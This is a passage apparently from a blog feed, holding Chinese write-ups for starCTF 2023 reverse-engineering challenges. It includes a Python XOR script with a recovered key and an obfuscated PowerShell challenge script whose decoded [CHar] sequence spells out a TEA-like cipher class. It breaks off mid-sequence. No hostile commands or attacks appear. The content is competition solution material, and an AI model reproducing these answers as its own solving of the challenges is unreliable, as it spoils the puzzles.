class="hljs-number">47</span>] = c;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">40</span>; i &lt; <span class="hljs-number">48</span>; i += <span class="hljs-number">8</span>)</span><br><span class="line">      <span class="hljs-built_in">dec</span>(&amp;cipher[i]);</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d %s\n"</span>, c, cipher);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>starctf-2023</title>
      <link href="/2023/07/31/starctf-2023/"/>
      <url>/2023/07/31/starctf-2023/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>佛系solo了一天，最后还是和上次的SCTF一样都是48名，感觉一个人做时间完全不够用，还有几道re和pwn感觉都可以做，但是已经没什么时间了。</p><span id="more"></span><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Gorev"><a href="#Gorev" class="headerlink" title="Gorev"></a>Gorev</h2><p>很简单的加密，用key对输入进行逐字节异或，但是key进行随机的位置交换，位数不多并且知道flag的格式，可以尝试手动恢复。</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="hljs-string">"fiAGBkgXN3McFy9hAHRfCwYaIjQCRDFsXC8ZYBFmEDU="</span></span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">res = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> base64.b64decode(res)]</span><br><span class="line"><span class="hljs-comment"># key="cH@t_GpT_15_h3R3"</span></span><br><span class="line">key=<span class="hljs-string">"TcR@3t_3hp_5_G1H"</span></span><br><span class="line">key = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key]</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(res)):</span><br><span class="line">    res[i]=res[i]^key[i%<span class="hljs-built_in">len</span>(key)]</span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(res))</span><br></pre></td></tr></tbody></table></figure><h2 id="Ezcode"><a href="#Ezcode" class="headerlink" title="Ezcode"></a>Ezcode</h2><p>chall是一个下面这样子的脚本，看样子是powershell，题目中也有提示是windows用户。</p><figure class="highlight powershell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-string">'('</span> | % { <span class="hljs-variable">$</span>{-``} = + <span class="hljs-variable">$</span>() } { <span class="hljs-variable">$</span>{]} = <span class="hljs-variable">$</span>{-``} } { <span class="hljs-variable">$</span>{!;*} = ++  <span class="hljs-variable">$</span>{-``} } { <span class="hljs-variable">$</span>{*<span class="hljs-selector-tag">@</span> } = (  <span class="hljs-variable">$</span>{-``} = <span class="hljs-variable">$</span>{-``} + <span class="hljs-variable">$</span>{!;*}  ) } { <span class="hljs-variable">$</span>{=<span class="hljs-variable">$</span>``} = (  <span class="hljs-variable">$</span>{-``} = <span class="hljs-variable">$</span>{-``} + <span class="hljs-variable">$</span>{!;*}  ) } { <span class="hljs-variable">$</span>{ ]} = (<span class="hljs-variable">$</span>{-``} = <span class="hljs-variable">$</span>{-``} + <span class="hljs-variable">$</span>{!;*}  ) } { <span class="hljs-variable">$</span>{!} = (<span class="hljs-variable">$</span>{-``} = <span class="hljs-variable">$</span>{-``} + <span class="hljs-variable">$</span>{!;*}  ) } { <span class="hljs-variable">$</span>{<span class="hljs-comment">#.} = (${-``} = ${-``} + ${!;*}  ) } { ${(} = (${-``} = ${-``} + ${!;*}  ) } { ${)``} = (${-``} = ${-``} + ${!;*}  ) } { ${``*%} = (${-``} = ${-``} + ${!;*}) } { ${$%} = "[" + "$(@{  })"[${(}  ] + "$(@{  })"[  "${!;*}${``*%}"  ] + "$(@{  }  )  "[  "${*@ }${]}"  ] + "$?"[${!;*}  ] + "]" } { ${-``} = "".("$(  @{}  )  "[  "${!;*}${ ]}"  ] + "$(@{})  "[  "${!;*}${#.}"] + "$(  @{  }  )"[${]}] + "$(@{}  )"[${ ]}] + "$?  "[  ${!;*}] + "$(  @{})"[${=$``}  ]) } { ${-``} = "$(@{  }  )"[  "${!;*}" + "${ ]}"] + "$(@{  })  "[${ ]}  ] + "${-``}"["${*@ }" + "${(}"  ] }  ) ;</span></span><br><span class="line">……</span><br></pre></td></tr></tbody></table></figure><p>去除最后的管道看到一些输出，根据输出解两次base64得到的是假flag，继续分析代码，发现这段代码只进行了输出，并没有真正执行，找到真正执行的代码，用write-output输出出来</p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">120</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">55</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">54</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">53</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">120</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">54</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">55</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">53</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">120</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">57</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">120</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">57</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">120</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">53</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">55</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">54</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">77</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">88</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">122</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">122</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">62</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">62</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">54</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">94</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">60</span>+<span 